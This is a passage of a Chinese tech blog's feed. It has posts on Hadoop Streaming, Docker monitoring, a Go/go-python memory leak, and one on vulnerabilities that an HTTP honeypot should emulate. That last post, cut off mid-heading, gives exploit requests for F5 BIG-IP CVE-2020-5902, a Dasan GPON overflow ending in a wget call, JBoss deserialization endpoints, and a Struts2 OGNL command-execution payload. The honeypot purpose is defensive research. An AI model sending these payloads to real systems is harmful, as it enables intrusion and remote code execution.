class="string">cowrie-config</span></span><br><span class="line">        <span class="attr">configMap:</span></span><br><span class="line">          <span class="attr">name:</span> <span class="string">cowrie-config</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;搭建集群&quot;&gt;&lt;a href=&quot;#搭建集群&quot; class=&quot;headerlink&quot; title=&quot;搭建集群&quot;&gt;&lt;/a&gt;搭建集群&lt;/h3&gt;&lt;h4 id=&quot;安装&quot;&gt;&lt;a href=&quot;#安装&quot; class=&quot;headerlink&quot; title=&quot;安装&quot;&gt;&lt;/a&gt;安装&lt;/h</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>Hadoop Sreaming Note</title>
    <link href="http://woodpile27.cn/2020/10/06/hadoop-steaming-note/"/>
    <id>http://woodpile27.cn/2020/10/06/hadoop-steaming-note/</id>
    <published>2020-10-06T00:00:00.000Z</published>
    <updated>2021-01-04T08:49:46.213Z</updated>
    
    <content type="html"><![CDATA[<h3 id="配置参数"><a href="#配置参数" class="headerlink" title="配置参数"></a>配置参数</h3><ul><li><strong>mapreduce.job.name</strong>：job name。</li><li><strong>mapreduce.job.priority</strong>：优先级调度，只是在计算任务向集群服务申请资源的时候会起作用。</li><li><strong>mapreduce.job.running.map.limit</strong>：每个作业最多可以同时跑多少个 map，默认是0，当值为0或负数时无限制。</li><li><strong>mapreduce.job.reduces</strong>：reduce任务个数，默认是1。</li><li><strong>mapred.input.dir.error.pass</strong>：跳过输入路径错误。</li><li><strong>mapred.split.zero.file.skip</strong>：如果文件长度为0则划分 split。</li></ul><h4 id="容错"><a href="#容错" class="headerlink" title="容错"></a>容错</h4><ul><li><strong>mapreduce.map.maxattempts</strong>：每个 map 任务最大重试次数，重试次数超过该值则认为任务运行失败。默认是4。</li><li><strong>mapreduce.reduce.maxattempts</strong>：每个 reduce 任务最大重试次数，同上。  </li><li><strong>mapreduce.task.timeout</strong>：Task 超时时间。如果一个任务在一定时间内不读取新的数据，也没有输出数据，则认为其处于 block 状态。为了防止用户程序永远 block 住不退出，强制设置了一个超时时间（单位毫秒），默认是300000。</li></ul><h4 id="压缩"><a href="#压缩" class="headerlink" title="压缩"></a>压缩</h4><ul><li><strong>mapreduce.map.output.compress</strong>：在通过网络发送之前map的输出是否压缩。默认 false。</li><li><strong>mapreduce.map.output.compress.codec</strong>：指定 map 输出所用的压缩 codec。</li></ul><p>对 map 输出进行数据压缩可以加速网络传输，对 reduce 输出进行数据压缩可以减少磁盘空间，如果输入文件是压缩的,那么在根据文件扩展名推断出相应的 codec 后，MapReduce 会在读取文件是自动解压缩文件。</p><h4 id="效率和稳定性"><a href="#效率和稳定性" class="headerlink" title="效率和稳定性"></a>效率和稳定性</h4><ul><li><strong>mapreduce.map.speculative</strong>：map 开启推测执行。默认 true。</li><li><strong>mapreduce.reduce.speculative</strong>：reduce 开启推测执行。默认 true。</li></ul><p>在作业执行时，由于一些原因，比如硬件老化、软件层面的不恰当配置等。某些机器上的任务实例执行的很慢，拖慢了整个作业的进度。Hadoop 不会尝试去诊断或者修复这些慢任务，相反它会在集群的其他节点上去启动这些慢任务的多个示例作为备份，这就是hadoop的推测执行（speculative execution）。</p><h3 id="map数量如何确定"><a href="#map数量如何确定" class="headerlink" title="map数量如何确定"></a>map数量如何确定</h3><p>map 的个数等于 split 的个数。<br>其由三个因素决定：</p><ol><li>输入文件数目</li><li>输入文件大小</li><li>配置参数</li></ol><p>一般来说，对于每一个输入的文件会有一个 map split。如果输入文件太大，会把大文件划分成多个 split 进行处理，每个 map 处理一个 split。<br>涉及的参数：</p><ul><li><strong>mapreduce.input.fileinputformat.split.minsize</strong>：启动 map 最小的 split size 大小，默认0</li><li><strong>mapreduce.input.fileinputformat.split.maxsize</strong>：启动 map 最大的 split size 大小，默认256M</li><li><strong>dfs.block.size</strong>：block 块大小。</li></ul><p>计算公式：<strong>splitSize =  Math.max(minSize, Math.min(maxSize, blockSize))</strong></p><p>FileInputFormat class 的 getSplits() 的伪代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">num_splits &#x3D; 0</span><br><span class="line">for each input file f:</span><br><span class="line">    remaining &#x3D; f.length</span><br><span class="line">    while remaining &#x2F; split_size &gt; split_slope:</span><br><span class="line">        num_splits +&#x3D; 1</span><br><span class="line">        remaining -&#x3D; split_size</span><br><span class="line">    where:</span><br><span class="line">        split_slope &#x3D; 1.1 分割斜率</span><br><span class="line">        split_size &#x3D;~ dfs.blocksize 分割大小约等于hdfs块大小</span><br></pre></td></tr></table></figure><p>会有一个比例进行运算来进行切片，为了减少资源的浪费<br>例如一个文件大小为260M，在进行 MapReduce 运算时，会首先使用260M/128M(blocksize)，得出的结果和1.1进行比较，大于则切分出一个128M作为一个分片，剩余132M，再次除以128(blocksize)，得到结果为1.03，小于1.1则将132作为一个切片，即最终260M被切分为两个切片进行处理，而非3个切片。  </p><h3 id="传参"><a href="#传参" class="headerlink" title="传参"></a>传参</h3><h4 id="sys-argv"><a href="#sys-argv" class="headerlink" title="sys.argv"></a>sys.argv</h4><p>mapper：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">arg1 = sys.argv[<span class="number">1</span>]</span><br><span class="line">arg2 = sys.argv[<span class="number">2</span>]</span><br></pre></td></tr></table></figure><p>hadoop straming：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$HADOOP</span> jar <span class="variable">$streaming_path</span> \</span><br><span class="line">    -mapper <span class="string">&quot;mapper.py arg1 arg2&quot;</span> \</span><br><span class="line">    -file <span class="string">&quot;mapper.py&quot;</span></span><br></pre></td></tr></table></figure><h4 id="环境变量"><a href="#环境变量" class="headerlink" title="环境变量"></a>环境变量</h4><p>mapper：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os  </span><br><span class="line"></span><br><span class="line">date_start = os.environ.get(<span class="string">&quot;date_start&quot;</span>)</span><br></pre></td></tr></table></figure><p>hadoop straming：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$HADOOP</span> jar <span class="variable">$streaming_path</span> \</span><br><span class="line">    -mapper <span class="string">&quot;mapper.py&quot;</span> \</span><br><span class="line">    -cmdenv <span class="string">&quot;date_start=<span class="variable">$date</span>&quot;</span></span><br></pre></td></tr></table></figure><h3 id="设置多个输入目录"><a href="#设置多个输入目录" class="headerlink" title="设置多个输入目录"></a>设置多个输入目录</h3><h4 id="使用多个-input选项-or-逗号分割"><a href="#使用多个-input选项-or-逗号分割" class="headerlink" title="使用多个-input选项 or 逗号分割"></a>使用多个-input选项 or 逗号分割</h4><p>多个 -input：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$HADOOP</span> jar <span class="variable">$streaming_path</span> \</span><br><span class="line">    -input <span class="string">&quot;/user/foo/dir1&quot;</span> \</span><br><span class="line">    -input <span class="string">&quot;/user/foo/dir2&quot;</span></span><br></pre></td></tr></table></figure><p>逗号分割：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$HADOOP</span> jar <span class="variable">$streaming_path</span> \</span><br><span class="line">    -input <span class="string">&quot;/user/foo/dir1,/user/foo/dir2&quot;</span></span><br></pre></td></tr></table></figure><h4 id="通配符"><a href="#通配符" class="headerlink" title="通配符"></a>通配符</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$HADOOP</span> jar <span class="variable">$streaming_path</span> \</span><br><span class="line">    -input <span class="string">&quot;/user/foo/dir[1-2]&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$HADOOP</span> jar <span class="variable">$streaming_path</span> \</span><br><span class="line">    -input <span class="string">&quot;/user/foo/&#123;dir1,dir2&#125;&quot;</span></span><br></pre></td></tr></table></figure><h3 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">input_file=(<span class="string">&quot;/user/foo/dir1&quot;</span> <span class="string">&quot;/user/foo/dir2&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="variable">$HADOOP</span> jar <span class="variable">$streaming_path</span> \</span><br><span class="line">    -input <span class="variable">$&#123;input_file[@]&#125;</span></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;配置参数&quot;&gt;&lt;a href=&quot;#配置参数&quot; class=&quot;headerlink&quot; title=&quot;配置参数&quot;&gt;&lt;/a&gt;配置参数&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;mapreduce.job.name&lt;/strong&gt;：job name。&lt;/li&gt;
&lt;li&gt;&lt;</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>Cadvisor+Prometheus+Grafana 监控 docker</title>
    <link href="http://woodpile27.cn/2020/09/16/docker-monitor/"/>
    <id>http://woodpile27.cn/2020/09/16/docker-monitor/</id>
    <published>2020-09-16T00:00:00.000Z</published>
    <updated>2021-01-04T08:52:35.004Z</updated>
    
    <content type="html"><![CDATA[<p>记录一下使用 Cadvisor+Prometheus+Grafana 监控 docker 的搭建过程。<br>全部使用 docker 容器搭建，效果还不错。</p><h3 id="Cadvisor"><a href="#Cadvisor" class="headerlink" title="Cadvisor"></a>Cadvisor</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">docker run    \                                      </span><br><span class="line">    --volume&#x3D;&#x2F;:&#x2F;rootfs:ro    \             </span><br><span class="line">    --volume&#x3D;&#x2F;var&#x2F;run:&#x2F;var&#x2F;run:rw    \                </span><br><span class="line">    --volume&#x3D;&#x2F;sys:&#x2F;sys:ro    \                         </span><br><span class="line">    --volume&#x3D;&#x2F;var&#x2F;lib&#x2F;docker&#x2F;:&#x2F;var&#x2F;lib&#x2F;docker:ro    \  </span><br><span class="line">    --publish&#x3D;8080:8080    \                          </span><br><span class="line">    --detach&#x3D;true    \                                </span><br><span class="line">    --name&#x3D;cadvisor    \                               </span><br><span class="line">    google&#x2F;cadvisor:latest</span><br></pre></td></tr></table></figure><h3 id="Prometheus"><a href="#Prometheus" class="headerlink" title="Prometheus"></a>Prometheus</h3><p>编辑 /etc/prometheus/prometheus.yml</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">global:</span><br><span class="line">  scrape_interval:     15s</span><br><span class="line">  evaluation_interval: 15s</span><br><span class="line"></span><br><span class="line">scrape_configs:</span><br><span class="line">  - job_name: &#39;docker&#39;</span><br><span class="line">    static_configs: </span><br><span class="line">    - targets: [&#39;192.168.1.152:8080&#39;]</span><br></pre></td></tr></table></figure><p>启动</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">docker run    \ </span><br><span class="line">    -p 9090:9090 -d    \ </span><br><span class="line">    -v &#x2F;etc&#x2F;prometheus&#x2F;prometheus.yml:&#x2F;etc&#x2F;prometheus&#x2F;prometheus.yml    \ </span><br><span class="line">    --name prometheus    \  </span><br><span class="line">    prom&#x2F;prometheus</span><br></pre></td></tr></table></figure><p>启动后访问 <code>http://ip:9090</code> Status 中的 Targets，确保 job 处于 up 状态。</p><h3 id="Grafana"><a href="#Grafana" class="headerlink" title="Grafana"></a>Grafana</h3><p>启动</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">docker run    \</span><br><span class="line">    --name grafana    \</span><br><span class="line">    -d -p 3000:3000    \ </span><br><span class="line">    grafana&#x2F;grafana</span><br></pre></td></tr></table></figure><p>启动后访问<code>http://ip:3000</code></p><ul><li>添加 Data Sources：选择 Prometheus， URL 配置为<code>http://192.168.1.152:9090</code></li><li>导入 dashboard：选择模板<code>https://grafana.com/dashboards/193</code>或<code>https://grafana.com/grafana/dashboards/10566</code>。import 后可看到效果。</li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;记录一下使用 Cadvisor+Prometheus+Grafana 监控 docker 的搭建过程。&lt;br&gt;全部使用 docker 容器搭建，效果还不错。&lt;/p&gt;
&lt;h3 id=&quot;Cadvisor&quot;&gt;&lt;a href=&quot;#Cadvisor&quot; class=&quot;headerlin</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>Go 应用内存泄漏问题的解决</title>
    <link href="http://woodpile27.cn/2020/09/15/go-memory-leak/"/>
    <id>http://woodpile27.cn/2020/09/15/go-memory-leak/</id>
    <published>2020-09-15T00:00:00.000Z</published>
    <updated>2021-01-04T08:58:11.825Z</updated>
    
    <content type="html"><![CDATA[<p>部署的一个 Go 语言写的程序出现内存占用逐渐上升的情况，排查了一段时间终于找到了原因。</p><h3 id="pprof"><a href="#pprof" class="headerlink" title="pprof"></a>pprof</h3><p>当出现内存占用不断上升的情况时，首先考虑是不是出现了内存泄露的问题。于是用 pprof 对程序进行持续的监控，从结果来看，goroutine 的数量一直在一个稳定的范围内，排除 goroutine 泄漏的情况。<br>接着讲目光转移到 inuse_space，然后看到了让我当时很疑惑的结果：<br><strong>pprof 的结果与实际的内存占用结果出现了很大的差异</strong> ，pprof 看到的内存占用只有个位数的 MB，而无论是 docker 占用的内存亦或是在容器里 top 看到的内存占用都达到了上百兆。</p><p>在一番 google 之下找到了原因：<br>pprof 看到的内存占用，其实只是 golang 逻辑上正在使用的内存量，不包括已被 GC 回收但尚未返还给操作系统的内存，同样也不包含内核态的内存占用，而 top 是站在操作系统层面看到的进程内存占用，理论上就是会比 pprof 看到的内存占用量更多。如果在工作中发现 top 看到占用的内存很大，而 pprof 看到的内存占用不多，有可能是两个问题导致的：</p><ul><li>有大量内存被 GC 但还没有来得及返还给操作系统</li><li>某些内核态操作（比如 I/O ）消耗了大量内存</li></ul><h3 id="byte-导致的问题？"><a href="#byte-导致的问题？" class="headerlink" title="[]byte 导致的问题？"></a>[]byte 导致的问题？</h3><p>我的程序在运行中会频繁的创建大量的 []byte，并且 []byte 的长度也不小。而用 pprof 发现这部分代码占用的内存确实较多，猜测是不是这部分占用的内存被 GC 后没有及时反还给操作系统。<br>stackoverflow 上有这样一个<a href="https://stackoverflow.com/questions/37382600/cannot-free-memory-once-occupied-by-bytes-buffer">问题</a>：无法释放由 bytes.Buffer 占用的内存。高赞回答：</p><blockquote><p>Go 是一种垃圾回收语言，这意味着当这些变量变得不可访问时，垃圾回收器会自动释放变量分配和使用的内存。释放的内存并不意味着将其返回给操作系统，释放的内存意味着可以回收该内存，并在需要时将其重新用于另一个变量。因此在操作系统中，不会仅由于某些变量变得不可访问而垃圾回收器检测到此变量并释放它所使用的内存就立刻看到内存减少。</p><p>但是如果 Go 运行一段时间（通常为5分钟）不使用，它将把内存返回给 OS。如果在此期间内存使用量增加，则很有可能不会将内存返回给操作系统。如果等待一段时间而不重新分配内存，则释放的内存最终将返回给操作系统（不是所有内存，而是未使用的“大块”内存）。如果想迫不及待发生这种情况，可以调用 debug.FreeOSMemory() 强制执行。</p></blockquote><p>这篇<a href="https://blog.cloudflare.com/recycling-memory-buffers-in-go/">文章</a>同样指出了类似的问题，但是通过运行作者的示例程序发现 HeapReleased 也即回收到操作系统的内存，并非像作者描述的不会经常变化，相反其变化的非常快，也就是 Go 在不断在操作系统中回收内存。<br>原因应该是这两篇文章都已经年代久远，Go 的更新迭代已经解决了上述问题。</p><h3 id="go-python"><a href="#go-python" class="headerlink" title="go-python"></a>go-python</h3><p>之后我又将目光转向 go-python，程序中会不断通过 go-python 调用一个 python 脚本，而 go-python 是通过 cgo 调用 libpython 实现的。<br>问题是否出在这儿呢？首先我进行了验证，即注释掉了相关代码并且使 CGO_ENABLED=0，测试结果发现程序没有出现之前的内存泄漏情况，于是终于找到了问题所在。<br>在 go-python 项目中有一个 <strong>memory leak</strong> 的 issue 吸引了我的注意：</p><blockquote><p>When to call GC？Do users need manual GC?</p></blockquote><blockquote><p>go-python is calling the CPython API through Cgo.<br>so you have to program as in C and follow the reference counting of the CPython API (calling python.Object.IncRef() and python.Object.DecRef().)</p><p>there’s no GC involved.<br><strong>you need to manually manage memory.</strong></p></blockquote><p>问题在于使用者需要手动管理内存，PyObject 对象使用结束后需要主动调用 <strong>DecRef</strong> ，通过减少引用计数的方式释放，否则就会发生内存泄漏的情况。实测 <strong>DecRef</strong> 可能会引发某些问题，可以根据 go-python 文档的推荐改用 <strong>Clear</strong> 。</p><h3 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h3><p><a href="https://segmentfault.com/a/1190000016412013">https://segmentfault.com/a/1190000016412013</a><br><a href="https://segmentfault.com/a/1190000019929993">https://segmentfault.com/a/1190000019929993</a><br><a href="https://github.com/wolfogre/go-pprof-practice/issues/1">https://github.com/wolfogre/go-pprof-practice/issues/1</a><br><a href="https://stackoverflow.com/questions/37382600/cannot-free-memory-once-occupied-by-bytes-buffer/37383604#37383604">https://stackoverflow.com/questions/37382600/cannot-free-memory-once-occupied-by-bytes-buffer/37383604#37383604</a><br><a href="https://stackoverflow.com/questions/45509538/freeing-unused-memory">https://stackoverflow.com/questions/45509538/freeing-unused-memory</a><br><a href="https://blog.cloudflare.com/recycling-memory-buffers-in-go/">https://blog.cloudflare.com/recycling-memory-buffers-in-go/</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;部署的一个 Go 语言写的程序出现内存占用逐渐上升的情况，排查了一段时间终于找到了原因。&lt;/p&gt;
&lt;h3 id=&quot;pprof&quot;&gt;&lt;a href=&quot;#pprof&quot; class=&quot;headerlink&quot; title=&quot;pprof&quot;&gt;&lt;/a&gt;pprof&lt;/h3&gt;&lt;p&gt;当出现内存占</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>HTTP 蜜罐中需要模拟响应的漏洞&amp;服务</title>
    <link href="http://woodpile27.cn/2020/08/19/http-honeypot/"/>
    <id>http://woodpile27.cn/2020/08/19/http-honeypot/</id>
    <published>2020-08-19T11:37:10.000Z</published>
    <updated>2021-01-04T08:58:39.471Z</updated>
    
    <content type="html"><![CDATA[<h3 id="CVE-2020-5902-F5-BIG-IP-Remote-Code-Execution"><a href="#CVE-2020-5902-F5-BIG-IP-Remote-Code-Execution" class="headerlink" title="CVE-2020-5902  - F5 BIG-IP Remote Code Execution"></a>CVE-2020-5902  - F5 BIG-IP Remote Code Execution</h3><h4 id="description"><a href="#description" class="headerlink" title="description"></a>description</h4><p>在 F5 BIG-IP 产品的流量管理用户页面 (TMUI)/配置实用程序的特定页面中存在一处远程代码执行漏洞。未授权的远程攻击者通过向该页面发送特制的请求包，可以造成任意Java 代码执行。进而控制 F5 BIG-IP 的全部功能，包括但不限于: 执行任意系统命令、开启/禁用服务、创建/删除服务器端文件等。<br>任意文件读取</p><ul><li><code>https://IP:8443/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=</code></li></ul><p>远程命令执行</p><ul><li><code>https://&#123;0&#125;/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=</code></li></ul><h4 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h4><p><a href="https://github.com/zhzyker/exphub/tree/master/f5">https://github.com/zhzyker/exphub/tree/master/f5</a><br><a href="https://github.com/dunderhay/CVE-2020-5902/blob/master/CVE-2020-5902.py">https://github.com/dunderhay/CVE-2020-5902/blob/master/CVE-2020-5902.py</a></p><h3 id="Dasan-Networks-GPON-ONT-WiFi-Router-H640X-12-02-01121-2-77p1-1124-3-03p2-1146-Remote-Code-Execution"><a href="#Dasan-Networks-GPON-ONT-WiFi-Router-H640X-12-02-01121-2-77p1-1124-3-03p2-1146-Remote-Code-Execution" class="headerlink" title="Dasan Networks GPON ONT WiFi Router H640X 12.02-01121 / 2.77p1-1124 / 3.03p2-1146 - Remote Code Execution"></a>Dasan Networks GPON ONT WiFi Router H640X 12.02-01121 / 2.77p1-1124 / 3.03p2-1146 - Remote Code Execution</h3><h4 id="description-1"><a href="#description-1" class="headerlink" title="description"></a>description</h4><p>Dasan GPON ONT WiFi Router是韩国DASAN Networks公司的一款无线路由器设备。Dasan GPON ONT WiFi Router H640X 12.02-0112版本、2.77p1-1124版本和3.03p2-1146版本中存在缓冲区溢出漏洞。攻击者可通过向 <strong>/cgi-bin/login_action.cgi</strong> 文件中的‘login_action’函数发送较长的POST请求利用该漏洞执行任意代码。</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/cgi-bin/login_action.cgi</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: 192.168.1.100:8080</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span>: en-US,en;q=0.5</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Referer</span>: https://192.168.1.100:8080/cgi-bin/login.cgi</span><br><span class="line"><span class="attribute">Connection</span>: keep-alive</span><br><span class="line"><span class="attribute">Content-Type</span>: application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span>: 868</span><br><span class="line"></span><br><span class="line">action=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA*Ԍ�CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC*�@;;;;;;;;;;;;;;;;;;;;;;;;wget http://1.1.1.1&amp;txtUserId=a&amp;button=Login&amp;txtPassword=a&amp;sle_Language=english</span><br></pre></td></tr></table></figure><h4 id="reference-1"><a href="#reference-1" class="headerlink" title="reference"></a>reference</h4><p><a href="https://www.exploit-db.com/exploits/44074">https://www.exploit-db.com/exploits/44074</a></p><h3 id="JBoss"><a href="#JBoss" class="headerlink" title="JBoss"></a>JBoss</h3><h4 id="description-2"><a href="#description-2" class="headerlink" title="description"></a>description</h4><p>CVE-2017-12149 - JBoss 5.x/6.x 反序列化漏洞</p><ul><li>该漏洞出现在 <strong>/invoker/readonly</strong> 请求中，服务器将用户提交的POST内容进行了Java反序列化。<br>直接将序列化数据作为POST body发送至/invoker/readonly即可</li></ul><p>CVE-2017-7504 - JBoss 4.x JBossMQ JMS 反序列化漏洞</p><ul><li>该漏洞出现在 <strong>/jbossmq-httpil/HTTPServerILServlet</strong> 中，直接把序列化数据POST。</li></ul><p>CVE-2015-7501 - JMXInvokerServlet 反序列化漏洞</p><ul><li>该漏洞出现在 <strong>/invoker/JMXInvokerServlet</strong> 中，与前一个类似。</li></ul><p>jmx-console 和 web-console</p><ul><li><strong>/jmx-console/HtmlAdaptor?action=inspectMBean&amp;name=jboss.system:type=ServerInfo</strong></li><li><strong>/web-console/ServerInfo.jsp</strong></li></ul><h4 id="reference-2"><a href="#reference-2" class="headerlink" title="reference"></a>reference</h4><p><a href="https://github.com/vulhub/vulhub/tree/master/jboss">https://github.com/vulhub/vulhub/tree/master/jboss</a><br><a href="https://www.exploit-db.com/exploits/36575">https://www.exploit-db.com/exploits/36575</a></p><h3 id="CVE-2018-11776-Apache-Struts2-S2-057"><a href="#CVE-2018-11776-Apache-Struts2-S2-057" class="headerlink" title="CVE-2018-11776 - Apache Struts2 S2-057"></a>CVE-2018-11776 - Apache Struts2 S2-057</h3><h4 id="description-3"><a href="#description-3" class="headerlink" title="description"></a>description</h4><p><a href="https://github.com/mazen160/struts-pwn_CVE-2018-11776">struts-pwn_CVE-2018-11776</a>使用数值计算的方式进行check。其首先生成一个随机数比如93，然后构造<code>$&#123;&#123;93*93&#125;&#125;</code> 替换url的一部分。</p><blockquote><p>以<code>http://example.com/demo/struts2-showcase/index.action</code>为例，会构造三个注入点依次测试：<br><code>http://example.com/$&#123;&#123;93*93&#125;&#125;/index.action</code><br><code>http://example.com/demo/$&#123;&#123;93*93&#125;&#125;/index.action</code><br><code>http://example.com/demo/struts2-showcase/$&#123;&#123;93*93&#125;&#125;/index.action</code></p></blockquote><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/$%7B%7B93*93%7D%7D/index.action</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: x.x.x.x</span><br><span class="line"><span class="attribute">Connection</span>: keep-alive</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Accept</span>: */*</span><br><span class="line"><span class="attribute">User-Agent</span>: struts-pwn (https://github.com/mazen160/struts-pwn_CVE-2018-11776)</span><br></pre></td></tr></table></figure><p>如果响应的Location字段返回了数值计算即93*93的结果则存在漏洞。根据注入点<br>构造payload</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/%24%7B%28%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23a%3D@java.lang.Runtime@getRuntime%28%29.exec%28%27&lt;----PAYLOAD----&gt;%27%29.getInputStream%28%29%2C%23b%3Dnew%20java.io.InputStreamReader%28%23a%29%2C%23c%3Dnew%20%20java.io.BufferedReader%28%23b%29%2C%23d%3Dnew%20char%5B51020%5D%2C%23c.read%28%23d%29%2C%23sbtest%3D@org.apache.struts2.ServletActionContext@getResponse%28%29.getWriter%28%29%2C%23sbtest.println%28%23d%29%2C%23sbtest.close%28%29%29%7D/index.action</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: x.x.x.x</span><br><span class="line"><span class="attribute">Connection</span>: keep-alive</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Accept</span>: */*</span><br><span class="line"><span class="attribute">User-Agent</span>: struts-pwn (https://github.com/mazen160/struts-pwn_CVE-2018-11776)</span><br></pre></td></tr></table></figure><h4 id="reference-3"><a href="#reference-3" class="headerlink" title="reference"></a>reference</h4><p><a href="https://github.com/mazen160/struts-pwn_CVE-2018-11776">https://github.com/mazen160/struts-pwn_CVE-2018-11776</a></p><h3 id="HomeMatic-Zentrale-CCU2-RCE"><a href="#HomeMatic-Zentrale-CCU2-RCE" class="headerlink" title="HomeMatic Zentrale CCU2 